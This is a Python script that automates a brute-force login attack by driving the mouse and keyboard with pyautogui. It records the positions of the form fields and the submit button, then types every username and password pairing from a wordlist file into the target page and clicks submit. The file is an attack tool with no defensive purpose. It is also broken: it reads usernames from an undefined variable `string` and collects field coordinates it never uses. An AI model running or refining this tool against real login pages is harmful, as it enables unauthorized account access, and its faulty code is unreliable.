import pyautogui as py
import time
import os
import linecache
from name_grapix import name
name()
def mover():
    py.press('tab')
    return True
wordlist="wordlist.txt"
print("Your scrren resolution:",py.size())
listoffield=[]
submitpos=[]
def position_getter():
    n=int(input("Enter the number of fields"))
    os.system("cls")

    for i in range(n):
        conf=input("Are You ready to select field ")
        time.sleep(2)
        x, y = py.position()
        py.click()
        print("Is your coor correct\nx:",x,"\ny:",y)
        listoffield.append((x,y))
    coef=input("Are youo ready to select submit button")
    time.sleep(2)
    x, y = py.position()
    py.click()
    print("Is your coor correct\nx:",x,"\ny:",y)
    submitpos.append((x,y))
    print(listoffield)
    print(submitpos)
position_getter()
def bruteforcer():
    with open(wordlist, 'r', newline="") as csvfile:
        content = csvfile.readlines() 

        print("Open the bruteforce target page")
        time.sleep(10)
        for i in range(len(content)):
            cur_user=string[i]
            for j in range(len(content)):
                cur_pass=content[j]
                print(cur_user,"\n",cur_pass)
                print("nowhere")
                if mover():
                    time.sleep(.01)
                    py.write(cur_user)
                    time.sleep(.01)
                    print("typed user")
                    if mover():
                        time.sleep(.01)
                        print("in pass")
                        py.write(cur_pass[0:-1])
                        #py.click(submitpos[0][0],submitpos[0][1])
                        #time.sleep(3)
                        print("typed pass")
                        py.click(submitpos[0][0],submitpos[0][1])
                        time.sleep(.2)
                        print(i)
bruteforcer()


